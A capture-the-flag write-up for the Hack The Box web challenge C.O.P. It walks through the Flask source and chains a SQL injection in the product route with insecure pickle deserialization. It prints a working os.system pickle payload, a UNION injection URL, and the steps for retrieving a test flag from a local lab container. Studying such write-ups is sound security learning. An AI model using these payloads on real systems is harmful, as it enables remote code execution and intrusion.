# INTRODUCTION

**C.O.P** is an apparently easy web-based challenge created by [InfoSecJack](https://www.hackthebox.com/home/users/profile/52045).

It involves exploitation of **SQL injection** followed by **insecure deserialization**.

Apart from the running instance, the source code of the web application is given.

# GOING THROUGH SOURCE CODE

The entrypoint to the application is at `challenge/run.py`.

```python
from application.app import app
from application.database import migrate_db

with app.app_context():
    migrate_db()

app.run(host='0.0.0.0', port=1337, debug=False, use_evalex=False)
```

It gives reference to the main `Flask` application script at `challenge/application/app.py`.

```python
from flask import Flask, g
from application.blueprints.routes import web
import pickle, base64

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')

@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close() 
```

There are 2 things worth noting here:

- The routes for this `Flask` application can be found at `challenge/application/blueprints/routes.py`.
- The `pickle` module is being used in a template filter called **'pickle'** to deserialize some data here which might be vulnerable to insecure deserialization if that data can be controlled by us.

```python
from flask import Blueprint, render_template
from application.models import shop

web = Blueprint('web', __name__)

@web.route('/')
def index():
    return render_template('index.html', products=shop.all_products()) 

@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
```

There are 2 routes here.

The `/` route simply renders the `index.html`. Also, the template expects a Jinja variable `products` whose values are fetched from the database.

Similarly, the `/view/<product_id>` renders `item.html`, and also expects another Jinja variable `product` whose value again is fetched from the database.

Apart from these, there is also a database model having `shop` table.

```html

SNIP
.
.
<div class="container px-4 px-lg-5 my-5">
    <div class="row gx-4 gx-lg-5 align-items-center">
    { % set item = product | pickle % }
    <div class="col-md-6"><img class="card-img-top mb-5 mb-md-0" src="{ { item.image } }" alt="..." /></div>
        <div class="col-md-6">
            <h1 class="display-5 fw-bolder">{ { item.name } }</h1>
            <div class="fs-5 mb-5">
                <span>£{ { item.price } }</span>
            </div>
            <p class="lead">{ { item.description } }</p>
        </div>
    </div>
</div>
.
.
SNIP

```

The `pickle` template filter that is found earlier is being used in the `item.html` template.

The value of `product` Jinja variable is deserialized using pickle before it is used in the template. 

This narrows down to the fact that if we can control `product` variable, we might be able to exploit insecure deserialization in `pickle` module.

The definition for the database model is at `challenge/application/models.py`.

```python

from application.database import query_db

class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')     

```

There are few things worth noting here:

- The function `query_db()` defined in `challenges/application/database.py` takes a query as parameter and runs it on the database.
- There is no sanitation being done on the `product_id` value in query parameter of `query_db()` in `select_by_id()` method. 
- And if we go back, we can see that the `product_id` is referenced from the `/view/<product_id>` route, which is totally in control of us.
- So there is a SQL injection vulnerability.

# CONNECTING PIECES TOGETHER

We can control `product_id` from the route `/view/<product_id>` through the SQL injection. 

This means we also have control over `product` jinja variable in the template `item.html`.

The above 2 facts lead to the conclusion that we can exploit an insecure deserialization in the `pickle` module through the `product_id` parameter in `/view/<product_id>` route.

# A WEIRD THING

The definition of `query_db()` is below:

```python

def query_db(query, args=(), one=False):
    with app.app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], value) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        print(rv)
        return (next(iter(rv[0].values())) if rv else None) if one else rv

```

There is a second parameter apart from the query which is named `one` and set to `False` by default.

This parameter basically decides if the function should return a single output row or all of the rows based on the value of `one` parameter.

It returns only the first row if the value of `one` is `True`.

And unfortunately the value of `one` is set to `True` in `query_db()` function of `select_by_id()` method.

That means if we try to inject our payload using the `UNION` sql injection method, it is supposed to not get deserialized since `select_by_id()` method will return the first output row from the query, which is a valid one.

Obviously, another way can be like exploiting a SQL stacked query to `INSERT/UPDATE` a new record containing malicious payload. But the `sqlite3` module in `python` does not support executing multiple queries using a single `execute()` method. So this is out-of-question.

But let us do not get drowned by assumptions and see things for practical.

```bash

┌──(n3hal㉿Universe7)-[~]
└─$ docker run -it cop:latest sh
/app # python run.py

```

I have popped an interactive `sh` shell on docker image. 

I also ran the entrypoint script, as this will do all the migration stuff and create the schema in the database.

```python

app # python
Python 3.8.16 (default, Dec  8 2022, 03:43:16) 
[GCC 12.2.1 20220924] on linux

>>> 
>>> import sqlite3
>>> con = sqlite3.connect('cop.db')
>>> 
>>> con.execute("SELECT 'I am first' UNION SELECT 'I am last'").fetchall()
[('I am first',), ('I am last',)]
>>> 

```

As expected, the string before the `UNION` comes first, and the string after `UNION` comes last.

Now see the MAGIC!!

```python

>>> con.execute("SELECT data FROM products WHERE id = '1' UNION SELECT 'I am supposed to come last, what the heck!!'").fetchall()
[('I am supposed to come last, what the heck!!',), ('gASVoAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDFBpY2tsZSBTaGlydJSMC2Rlc2NyaXB0aW9ulIwZR2V0IG91ciBuZXcgcGlja2xlIHNoaXJ0IZSMBWltYWdllIwfL3N0YXRpYy9pbWFnZXMvcGlja2xlX3NoaXJ0LmpwZ5SMBXByaWNllIwCMjOUdWIu',)]
>>> 

```

When we used a query on the `products` table with `WHERE` clause, the string after `UNION` comes first in the output and the output of the original query before the `UNION` comes at last.

This behaviour can be used to our advantage. We can use `UNION` in the SQL injection to inject our deserialization payload, and by this behaviour the injected payload will be deserialized and we might get code execution.

# CRAFTING DESERIALIZATION PAYLOAD

I do not intend to spend much time in explaining deserialization in pickle.

You can refer to this [guide](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) for specifics about the topic.

Let me give you an overview: while deserializing a pickled python class, if there is a `__reduce__` method defined in the class, it is supposed to return a function along with a tuple of arguments. Finally, the returned function is called, with the arguments in the returned tuple. This essentially gives us the potential to achieve code execution.

```python

import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('cp /app/flag.txt /app/application/static/flag.txt')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

```

We have created a `RCE` class having defined a `__reduce__()` method that returns the function `os.system` and a tuple having a `bash` command as a value. Then we serialize and base64 the output.

When the output is deserialized, the `/app/flag.txt` is copied to `/app/application/static/flag.txt` which is the static directory of `Flask` and is publicly accessible. 

The reason I `cp`'ed it and not `cat`'ed because it is a blind injection and we can not see the output of `cat`.

```bash

┌──(n3hal㉿Universe7)-[~/…/challenges/web/c.o.p/exploit]
└─$ python exploit.py 
b'gASVTAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDFjcCAvYXBwL2ZsYWcudHh0IC9hcHAvYXBwbGljYXRpb24vc3RhdGljL2ZsYWcudHh0lIWUUpQu'

```

We have crafted the deserialization payload.

# CRAFTING SQL INJECTION PAYLOAD

The injection point is the `product_id` in the `/view/<product_id>` route.

If the id of the product is `1`, the full URL will be `http://[IP]:[PORT]/view/1`.

We want to use `UNION` to inject the deserialized payload. The final payload will be:


```bash

http://[IP]:[PORT]/view/1' UNION SELECT 'gASVTAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDFjcCAvYXBwL2ZsYWcudHh0IC9hcHAvYXBwbGljYXRpb24vc3RhdGljL2ZsYWcudHh0lIWUUpQu';--

```

After we make the HTTP request to the payload URL, we just need to check for `flag.txt` in `/static` route.

```bash

┌──(n3hal㉿Universe7)-[~/…/challenges/web/c.o.p/exploit]
└─$ curl 'http://172.17.0.2:1337/static/flag.txt'                                                                                                                                     
HTB{f4k3_fl4gs_f0r_t3st1ng}

```

We can see that our payload worked. Try the same thing on the running instance to get the real flag.

This is all I have in this challenge. 

Thanks for reading this far :) Hope you liked it.
